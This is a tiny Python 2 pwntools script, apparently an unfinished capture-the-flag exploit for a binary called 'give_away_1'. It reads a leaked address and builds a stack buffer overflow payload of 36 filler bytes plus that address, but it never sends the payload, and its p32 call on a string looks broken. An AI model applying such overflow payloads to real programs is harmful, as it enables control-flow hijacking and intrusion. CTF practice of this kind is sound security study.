from pwn import *

p = process('./give_away_1')
a = p.recvline()
print a
addr = p32(a.split()[2])


payload = "A"*36+addr
